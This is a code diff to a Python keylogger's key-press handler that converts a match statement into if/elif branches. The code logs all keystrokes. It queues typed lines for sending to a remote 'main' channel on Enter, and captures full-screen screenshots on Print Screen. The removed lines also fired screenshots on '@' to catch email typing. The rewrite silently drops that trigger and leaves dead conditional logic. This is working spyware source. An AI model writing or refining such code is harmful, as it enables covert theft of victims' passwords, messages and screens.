@@ -10,16 +10,22 @@ def on_press(key):
     if processed_key in ctrl_codes.keys():
         processed_key = ' `' + ctrl_codes[processed_key] + '`'
     if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
-        match processed_key:
-            case Key.space: processed_key = ' '
-            case Key.shift: processed_key = ' *`SHIFT`*'
-            case Key.tab: processed_key = ' *`TAB`*'
-            case Key.backspace: processed_key = ' *`<`*'
-            case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
-            case Key.print_screen|'@':
-                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
-                ImageGrab.grab(all_screens=True).save('ss.png')
-                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
+        if processed_key == Key.space:
+            processed_key = ' '
+        elif processed_key == Key.shift:
+            processed_key = ' *`SHIFT`*'
+        elif processed_key == Key.tab:
+            processed_key = ' *`TAB`*'
+        elif processed_key == Key.backspace:
+            processed_key = ' *`<`*'
+        elif processed_key == Key.enter:
+            processed_key = ''
+            messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*'])
+            text_buffor = ''
+        elif processed_key == Key.print_screen:
+            processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
+            ImageGrab.grab(all_screens=True).save('ss.png')
+            embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
         text_buffor += str(processed_key)
         if len(text_buffor) > 1975:
             if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
